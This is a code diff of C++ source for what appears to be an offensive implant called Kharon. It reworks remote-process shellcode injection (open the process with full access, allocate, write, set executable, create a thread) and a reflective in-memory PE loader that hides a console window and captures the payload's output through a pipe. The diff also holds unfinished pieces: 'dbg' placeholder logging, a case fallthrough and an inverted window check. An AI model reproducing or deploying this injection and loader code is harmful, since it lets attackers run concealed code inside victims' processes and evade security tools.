@@ -1,13 +1,12 @@
 #include <Kharon.h>
 
 auto DECLFN Injection::Shellcode(
+    _In_ ULONG ProcessID,
     _In_ PBYTE Buffer,
-    _In_ UPTR  Size
+    _In_ UPTR  Size,
+    _In_ PVOID Param
 ) -> BOOL {
     BOOL  Success = FALSE;
-    PBYTE OutBuff = { 0 };
-    ULONG Length  = 0;
-    PVOID Param   = NULL;
 
     switch ( Self->Inj->Ctx.Sc.TechniqueID ) {
         case ScClassic: {
@@ -15,93 +14,66 @@ auto DECLFN Injection::Shellcode(
             ULONG  TdID     = 0;
             HANDLE TdHandle = INVALID_HANDLE_VALUE;
 
+            KhDbg("dbg");
+
             Success = Self->Inj->Classic( 
-                Buffer, Size, Param, &ScBase, &TdHandle, &TdID, &OutBuff, &Length 
+                ProcessID, Buffer, Size, Param, &ScBase
             );
+
+            KhDbg("dbg");
 
             if ( !Success ) return Success;
 
-            Self->Pkg->Int64( GLOBAL_PKG, U_PTR( ScBase ) );
-            Self->Pkg->Int32( GLOBAL_PKG, TdID );
-            
-            if ( Self->Inj->Ctx.Spawn && OutBuff && Length ) {
-                Self->Pkg->Bytes( GLOBAL_PKG, OutBuff, Length );
-            }
+            KhDbg("dbg");
+            KhDbg("dbg");
+        }
+        case ScStomp: {
+
         }
     }
+
+    return Success;
 }
 
 auto DECLFN Injection::Classic(
-    _In_      PBYTE   Buffer,
-    _In_      UPTR    Size,
-    _In_      PVOID   Param,
-    _Out_     PVOID*  Base,
-    _Out_     HANDLE* TdHandle,
-    _Out_     PULONG  TdID,
-    _Out_opt_ PBYTE*  OutBuff,
-    _Out_opt_ ULONG*  OutLen
+    _In_  ULONG   ProcessID,
+    _In_  PBYTE   Buffer,
+    _In_  UPTR    Size,
+    _In_  PVOID   Param,
+    _Out_ PVOID*  Base
 ) -> BOOL {
+    BOOL   Success    = FALSE;
+    HANDLE PsHandle   = INVALID_HANDLE_VALUE; 
     HANDLE PipeHandle = INVALID_HANDLE_VALUE;
     PVOID  TmpMem     = NULL;
+    PVOID  BaseRet    = NULL;
     ULONG  OldProt    = 0;
     ULONG  BytesRead  = 0;
-    ULONG  Success    = FALSE;
     ULONG  FullSize   = 0;
 
-    if ( Self->Inj->Ctx.Pipe.b ) {
-        FullSize = ( 
-            Size + sizeof( Self->Inj->Ctx.Pipe.s ) + Self->Inj->Ctx.Pipe.s + 
-            sizeof( Self->Inj->Ctx.Param.s ) + Self->Inj->Ctx.Param.s
-        );
+    if ( ProcessID != 0 ) {
+        PsHandle = Self->Ps->Open( PROCESS_ALL_ACCESS, FALSE, ProcessID );
+    }
 
-        TmpMem = Self->Mm->Alloc( 0, 0, FullSize, MEM_COMMIT, PAGE_READWRITE );
-        // Mem::Copy( TmpMem, Buffer, Size );
-        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size ), &Self->Inj->Ctx.Pipe.Length, sizeof( Self->Inj->Ctx.Pipe.Length ) );
-        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.Length ) ), Self->Inj->Ctx.Pipe.Name, Self->Inj->Ctx.Pipe.Length );
-        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.Length ) + Self->Inj->Ctx.Pipe.Length ), &Self->Inj->Ctx.Param.Length, sizeof( Self->Inj->Ctx.Param.Length ) );
-        // Mem::Copy( reinterpret_cast<char*>( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.l ) + Self->Inj->Ctx.Pipe.l + sizeof(Self->Inj->Ctx.Param.Length), Self->Inj->Ctx.Param.Buffer, Self->Inj->Ctx.Param.Length );
+    BaseRet = Self->Mm->Alloc( PsHandle, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+
+    if ( PsHandle != INVALID_HANDLE_VALUE ) {
+        Success = Self->Mm->Write( PsHandle, BaseRet, Buffer, Size );
+        if ( !Success ) goto _KH_END;
     } else {
-        FullSize = Size;
-        TmpMem   = Buffer;
+        Mem::Copy( BaseRet, Buffer, Size );
     }
 
-    *Base = Self->Mm->Alloc( 0, Base, FullSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-    if ( !*Base ) { Success = FALSE; return Success; }
+    Success = Self->Mm->Protect( PsHandle, BaseRet, Size, PAGE_EXECUTE_READ, &OldProt );
+    if ( !Success ) goto _KH_END;
 
-    if ( Self->Inj->Ctx.Spawn ) {
-        Success = Self->Mm->Write( 0, Base, B_PTR( TmpMem ), FullSize );
-        Self->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
-        if ( !Success ) { return Success; }
-    } else {
-        Mem::Copy( Base, B_PTR( TmpMem ), FullSize );
-        Self->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
-    }
-
-    Success = Self->Mm->Protect( 0, Base, FullSize, PAGE_EXECUTE_READ, &OldProt );
-    if ( !Success ) { return Success; }
-
-    *TdHandle = Self->Td->Create( 0, Base, Param, 0, 0, TdID );
-    if ( !*TdHandle ) { Success = FALSE; return Success; }
-
-    if ( Self->Inj->Ctx.Pipe.b ) {
-        PipeHandle = Self->Krnl32.CreateFileA( 
-            Self->Inj->Ctx.Pipe.p, GENERIC_READ, FILE_SHARE_READ, 0, 
-            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 
-        );
-        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
-            return FALSE;
-        }
-    
-        Success = Self->Krnl32.ConnectNamedPipe( PipeHandle, 0 );
-    
-        // Self->Krnl32.PeekNamedPipe( PipeHandle,  )
-
-        // Self->Krnl32.ReadFile( PipeHandle, OutBuff,  )
-    }
-
-
-
+    Self->Td->Create( PsHandle, BaseRet, Param, 0, 0, 0 );
 _KH_END:
+    if ( !Success && BaseRet ) {
+        Self->Mm->Free( PsHandle, BaseRet, Size, MEM_RELEASE );
+    } else {
+        *Base = BaseRet;
+    }
 
     return Success;
 }
@@ -113,15 +85,22 @@ _KH_END:
 auto DECLFN Injection::Reflection(
     _In_ PBYTE  Buffer,
     _In_ ULONG  Size,
-    _In_ PVOID  Param,
-    _In_ PBYTE* OutBuff
+    _In_ PVOID  Param
 ) -> BOOL {
-    PBYTE ImgBase = NULL;
-    ULONG ImgSize = 0;
-    UPTR  Delta   = 0;
-    BOOL  IsDll   = FALSE;
-    PWCH* Argv   = NULL;
-    INT   Argc    = 0;
+    PBYTE  ImgBase = NULL;
+    ULONG  ImgSize = 0;
+    UPTR   Delta   = 0;
+    BOOL   IsDll   = FALSE;
+    PWCH*  Argv    = NULL;
+    INT    Argc    = 0;
+
+    PULONG Reads     = { 0 };
+    HWND   WinHandle = NULL;
+    HANDLE BackupOut = INVALID_HANDLE_VALUE;
+    HANDLE PipeRead  = INVALID_HANDLE_VALUE;
+    HANDLE PipeWrite = INVALID_HANDLE_VALUE;
+
+    SECURITY_ATTRIBUTES SecAttr = { 0 };
 
     PIMAGE_NT_HEADERS     Header = { 0 };
     PIMAGE_SECTION_HEADER SecHdr = { 0 };
@@ -134,10 +113,16 @@ auto DECLFN Injection::Reflection(
     ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 
     IsDll = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;
-    Delta = Header->OptionalHeader.ImageBase;
-    Size  = Header->OptionalHeader.SizeOfImage;
+
+    KhDbg( "parsed pe" );
+    KhDbg( "is %s", IsDll ? "DLL" : "EXE" );
 
     ImgBase = (PBYTE)Self->Mm->Alloc( 0, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+
+    Delta = Header->OptionalHeader.ImageBase - U_PTR( ImgBase );
+    Size  = Header->OptionalHeader.SizeOfImage;
+
+    KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         Mem::Copy(
@@ -147,8 +132,12 @@ auto DECLFN Injection::Reflection(
         );
     }
 
+    KhDbg( "sections copied" );
+
     Self->Usf->FixImp( ImgBase, ImpDir );
     Self->Usf->FixRel( ImgBase, Delta, RelDir );
+
+    KhDbg( "fixed imports and relocations" );
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
@@ -168,17 +157,38 @@ auto DECLFN Injection::Reflection(
 		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
 			MemoryProtection = PAGE_EXECUTE;
 
-		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
+		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
 			MemoryProtection = PAGE_EXECUTE_WRITECOPY;
 
-		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
+		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
 			MemoryProtection = PAGE_EXECUTE_READ;
 
-		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
+		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
 			MemoryProtection = PAGE_EXECUTE_READWRITE;
 
         if ( !( Self->Mm->Protect( NtCurrentProcess(), &SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
     }
+
+    KhDbg( "fixed sections memory protections" );
+
+    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+
+    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );
+
+    WinHandle = Self->Krnl32.GetConsoleWindow();
+
+    if ( !WinHandle ) {
+        Self->Krnl32.AllocConsole();
+
+        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
+            Self->User32.ShowWindow( WinHandle, SW_HIDE );
+        }
+    }
+
+    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
+    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
+
+    KhDbg( "starting execution of the pe" );
 
     if ( IsDll ) {
         BOOL ( *KDllMain )( PVOID, ULONG, PVOID ) = decltype( KDllMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
@@ -193,4 +203,16 @@ auto DECLFN Injection::Reflection(
             KMain( Argc, Argv );
         }
     }
+
+    KhDbg( "reading bytes..." );
+
+    Self->Inj->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
+    Self->Krnl32.ReadFile( PipeRead, Self->Inj->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );
+
+_KH_END:
+    if ( ImgBase ) {
+        Self->Mm->Free( NULL, ImgBase, Size, MEM_RELEASE );
+    }
+
+    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
 }
